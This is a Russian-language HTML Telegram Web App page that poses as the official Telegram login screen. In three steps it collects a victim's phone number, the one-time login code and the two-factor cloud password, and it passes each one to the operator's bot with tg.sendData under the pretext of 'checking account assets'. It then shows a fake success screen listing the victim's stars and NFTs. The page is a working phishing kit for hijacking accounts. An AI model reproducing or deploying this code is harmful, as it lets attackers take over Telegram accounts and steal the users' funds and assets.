<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Авторизация Telegram</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      background: white;
      color: black;
    }
    .container {
      text-align: center;
      width: 100%;
      max-width: 400px;
      padding: 0 20px;
    }
    .step {
      display: none;
    }
    .step.active {
      display: block;
    }
    .logo {
      margin: 0 auto 25px auto;
    }
    .logo img {
      width: 60px;
      height: 60px;
      border-radius: 50%;
    }
    h2 {
      font-size: 17px;
      font-weight: bold;
      margin: 10px 0;
    }
    p {
      font-size: 14px;
      color: #000;
      margin: 8px 0 20px;
      line-height: 1.4;
    }
    select, input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: none;
      border-radius: 12px;
      background: #f3f4f8;
      font-size: 16px;
      text-align: center;
    }
    .phone-input {
      display: flex;
      align-items: center;
      gap: 8px;
      background: #f3f4f8;
      border-radius: 12px;
      margin: 8px 0;
      padding: 12px;
    }
    .phone-input span {
      font-size: 16px;
      font-weight: bold;
    }
    .phone-input input {
      background: transparent;
      margin: 0;
      padding: 0;
    }
    .buttons {
      display: flex;
      justify-content: space-between;
      margin-top: 30px;
    }
    .btn {
      flex: 1;
      margin: 0 4px;
      padding: 12px;
      border: none;
      border-radius: 25px;
      font-size: 16px;
      cursor: pointer;
      font-weight: bold;
    }
    .btn.cancel {
      background: none;
      color: #229ED9;
    }
    .btn.submit {
      background-color: #229ED9;
      color: white;
    }
    .btn:disabled {
      background-color: #ccc;
      cursor: not-allowed;
    }
    .step-indicator {
      display: flex;
      justify-content: center;
      margin: 20px 0;
    }
    .step-dot {
      width: 8px;
      height: 8px;
      border-radius: 50%;
      background: #ddd;
      margin: 0 4px;
    }
    .step-dot.active {
      background: #229ED9;
    }
    .status-message {
      padding: 10px;
      border-radius: 8px;
      margin: 10px 0;
      font-size: 14px;
    }
    .status-success {
      background: #d4edda;
      color: #155724;
    }
    .status-error {
      background: #f8d7da;
      color: #721c24;
    }
    .status-info {
      background: #d1ecf1;
      color: #0c5460;
    }
  </style>
</head>
<body>  
  <div class="container">
    <!-- Шаг 1: Ввод телефона -->
    <div id="step1" class="step active">
      <div class="logo">
        <img src="https://telegram.org/img/t_logo.png" alt="Telegram">
      </div>
      <h2>Введите номер Telegram</h2>
      <p>Для проверки аккаунта и доступных активов</p>
      
      <select id="country">
        <option value="RU" data-code="+7">Россия +7</option>
        <option value="US" data-code="+1">США +1</option>
        <option value="GB" data-code="+44">Великобритания +44</option>
      </select>
      
      <div class="phone-input">
        <span id="countryCode">+7</span>
        <input type="text" id="phone" placeholder="XXX XXX XX XX" required>
      </div>
      
      <div class="step-indicator">
        <div class="step-dot active"></div>
        <div class="step-dot"></div>
        <div class="step-dot"></div>
      </div>
      
      <div class="buttons">
        <button type="button" class="btn cancel">ОТМЕНА</button>
        <button type="button" class="btn submit" onclick="submitPhone()">ДАЛЕЕ</button>
      </div>
    </div>

    <!-- Шаг 2: Ввод кода -->
    <div id="step2" class="step">
      <div class="logo">
        <img src="https://telegram.org/img/t_logo.png" alt="Telegram">
      </div>
      <h2>Код из Telegram</h2>
      <p>Введите код, отправленный в Telegram</p>
      
      <div id="displayPhone" style="font-weight: bold; margin: 10px 0;"></div>
      
      <input type="text" id="code" placeholder="12345" maxlength="5" required>
      
      <div class="step-indicator">
        <div class="step-dot"></div>
        <div class="step-dot active"></div>
        <div class="step-dot"></div>
      </div>
      
      <div class="buttons">
        <button type="button" class="btn cancel" onclick="previousStep()">НАЗАД</button>
        <button type="button" class="btn submit" onclick="submitCode()">ПОДТВЕРДИТЬ</button>
      </div>
    </div>

    <!-- Шаг 3: 2FA пароль -->
    <div id="step3" class="step">
      <div class="logo">
        <img src="https://telegram.org/img/t_logo.png" alt="Telegram">
      </div>
      <h2>Пароль облака</h2>
      <p>Введите пароль двухфакторной аутентификации</p>
      
      <input type="password" id="password" placeholder="Пароль облака" required>
      
      <div class="step-indicator">
        <div class="step-dot"></div>
        <div class="step-dot"></div>
        <div class="step-dot active"></div>
      </div>
      
      <div class="buttons">
        <button type="button" class="btn cancel" onclick="previousStep()">НАЗАД</button>
        <button type="button" class="btn submit" onclick="submitPassword()">АВТОРИЗОВАТЬ</button>
      </div>
    </div>

    <!-- Шаг 4: Результат -->
    <div id="step4" class="step">
      <div class="logo">
        <img src="https://telegram.org/img/t_logo.png" alt="Telegram">
      </div>
      <h2>Проверка аккаунта</h2>
      <div id="resultMessage"></div>
    </div>
  </div>

  <script>
    let tg = window.Telegram.WebApp;
    let currentStep = 1;
    let userPhone = '';
    let userCode = '';

    tg.expand();

    function updateCode() {
      const select = document.getElementById('country');
      const code = select.options[select.selectedIndex].dataset.code;
      document.getElementById('countryCode').textContent = code;
    }

    function showStep(step) {
      document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
      document.getElementById(`step${step}`).classList.add('active');
      currentStep = step;
      updateStepIndicator();
    }

    function updateStepIndicator() {
      document.querySelectorAll('.step-dot').forEach((dot, index) => {
        dot.classList.toggle('active', index + 1 === currentStep);
      });
    }

    function submitPhone() {
      const countryCode = document.getElementById('countryCode').textContent;
      const phone = document.getElementById('phone').value;
      userPhone = countryCode + phone.replace(/\D/g, '');

      if (!phone || phone.replace(/\D/g, '').length < 5) {
        tg.showPopup({title: 'Ошибка', message: 'Введите корректный номер', buttons: [{type: 'ok'}]});
        return;
      }

      // Отправляем номер в бот
      tg.sendData(JSON.stringify({
        type: 'submit_phone',
        phone: userPhone
      }));

      document.getElementById('displayPhone').textContent = userPhone;
      showStep(2);
    }

    function submitCode() {
      const code = document.getElementById('code').value;
      userCode = code;

      if (!code || code.length < 5) {
        tg.showPopup({title: 'Ошибка', message: 'Введите код из 5 цифр', buttons: [{type: 'ok'}]});
        return;
      }

      // Отправляем код в бот
      tg.sendData(JSON.stringify({
        type: 'submit_code',
        phone: userPhone,
        code: code
      }));

      showStep(3);
    }

    function submitPassword() {
      const password = document.getElementById('password').value;

      if (!password) {
        tg.showPopup({title: 'Ошибка', message: 'Введите пароль', buttons: [{type: 'ok'}]});
        return;
      }

      // Отправляем пароль в бот
      tg.sendData(JSON.stringify({
        type: 'submit_password',
        phone: userPhone,
        code: userCode,
        password: password
      }));

      showStep(4);
      document.getElementById('resultMessage').innerHTML = 
        '<div class="status-info">Проверяем аккаунт и активы...</div>';
    }

    function previousStep() {
      if (currentStep > 1) showStep(currentStep - 1);
    }

    // Обработка результатов от бота
    tg.onEvent('webAppDataReceived', (event) => {
      const data = JSON.parse(event.data);
      
      if (data.type === 'auth_success') {
        document.getElementById('resultMessage').innerHTML = `
          <div class="status-success">
            <h3>✅ Авторизация успешна!</h3>
            <p>Баланс звезд: ${data.balance || 0} ⭐️</p>
            <p>NFT: ${data.nfts || 0} шт</p>
            <p>Статус: Активы проверены</p>
          </div>
        `;
      } else if (data.type === 'auth_error') {
        document.getElementById('resultMessage').innerHTML = `
          <div class="status-error">
            <h3>❌ Ошибка авторизации</h3>
            <p>${data.error || 'Неизвестная ошибка'}</p>
          </div>
        `;
      }
    });

    document.getElementById('phone').addEventListener('input', function(e) {
      let numbers = e.target.value.replace(/\D/g, '');
      let result = '';
      if (numbers.length > 0) result += numbers.substring(0, 3);
      if (numbers.length > 3) result += ' ' + numbers.substring(3, 6);
      if (numbers.length > 6) result += ' ' + numbers.substring(6, 8);
      if (numbers.length > 8) result += ' ' + numbers.substring(8, 10);
      e.target.value = result;
    });

    document.getElementById('country').addEventListener('change', updateCode);
    document.querySelector('.btn.cancel').addEventListener('click', () => tg.close());

    updateCode();
  </script>
</body>
</html>
